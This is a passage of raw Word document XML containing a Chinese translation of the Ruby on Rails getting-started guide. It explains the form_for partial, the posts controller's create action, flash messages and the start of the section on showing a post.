              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>pluralize(@post.errors.count, "error") %&gt;</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>prohibited  this post from being saved:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D4ACA8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&lt;ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59479C1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@post.errors.full_messages.each</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|msg| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B3C076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&lt;li&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>msg %&gt;&lt;/li&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38F4ED9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274B4DF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&lt;/ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EF9BDB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1DF0D56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3B38814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01C5447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07E116E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f.label :name</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613844D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f.text_field :name</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46B5709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39AD3DE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462B9F3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f.label :title</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128860A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f.text_field :title</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14F054F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62F9267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0B461BD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f.label :content</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1BA6FB2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f.text_area :content</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6FFE885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12C09A9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class="actions"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01F8576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f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F3CA54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449DD03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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="028D0A0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这个 partial 接收在 view 文件中定义的所有的实例变量。因此在本例中，controller 申请新的 Post 对象给@post，@post 在 view 和 partial 都是可用的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C5D959"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有关 partials 的更多信息，参考 </w:t>
      </w:r>
      <w:hyperlink r:id="rId90" w:anchor="using-partials" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Layouts and Rendering in Rails</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> guide 指导。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C301761"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rPr>
        <w:t>form_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块用于创建一个HTML表单。在这个代码块中你可以在访问方法的基础上在表单上创建各种控制。比如，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f.text_field :name</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 告诉 Rails 在表单中创建一个 text input 并且对应于显示实例的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 属性。form 使用的方法基于 model 的相对应的字段属性（类型如 text_field 或 text_area）（例如本例中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>title</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>content</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）。Rails 偏好于使用（偏向于使用）</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 列出你要输入的 HTML 行因为这样代码更加简洁，并且这样使得 form 和 particular model 实例关系更加明显。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFDD24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rPr>
        <w:t>form_for</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块同样也足够你定制你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>New Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Edit Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action,并且将会设置 form </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>action</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 标签以及在 HTML 输出中显示的提交按钮的名称。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3379F418"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如果你需要创建一个 HTML 表单显示任意的域，而不绑定到 model 字段中，你应该使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，它快捷的保证了建立 forms 不必在绑定到一个 model 实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68961CE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当用户点击这张表单上面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Create Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 按钮，浏览器将会发回信息到controller的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action（Rails知道调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，因为form是以HTTP POST请求发送，这是我随后提到的一种协议之一）：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="62A685C2" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61E092A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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F65FED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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.new(params[:post])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06EF05A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1AB7C4E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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1708F25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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@post.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D44A33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format.html  { redirect_to(@post, :notice</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Post was successfully created.') }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D36E2C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format.json  { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @post, :status</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :created, :location</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @post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1DA7C08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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="479267D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format.html  { render :action</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "new"</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56A5962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format.json  { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @post.errors, :status</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :unprocessable_entity</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297EAFE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7C2F51A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3E5BCBC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29666135"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rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action 实例化一个新的 Post 对象，这个对象给 form 提供数据支持，Rails 会生成有效的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hash。当成功的保存了新 post，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回用户请求的适当的格式（在本例中是 HTML）。然后重定向用户页面到结果显示的 post show action页面并且给出提示 Post 成功的创建了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AC002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如果 post 没有保存成功，是因为（数据）验证错误，然后 controller 控制用户页面回到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action（包含验证错误新息）给用户，以便用户更改错误并重新提交。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8EA019" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">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“Post was successfully created.” 这条消息被存储在 Rails 的 flash 的 hash 表中，（通常之叫它 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the flash</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ）因此消息可以转载到另一个 action，在请求状态中提供有用的信息给用户。在这个新建例子（数据验证失败）中，用户实际上从来不看任何在页面创建进程中的渲染页面，因为它立刻重 定向页面到 new Post当 Rails 保存了这个记录。”Flash装载消息到接下来的 action，因此当用户被重定向到了 show action，他们立刻收到了一条消息“Post was successfully created.”。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A0C750"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9.10 显示一条 Post</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610AEEA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当你在posts 的主页面点击一个 post 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个超链接，他将会产生一个 url： </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http://localhost:3000/posts/1</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。Rails解释这是一个resource的</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action 调用。这里是 </w:t>
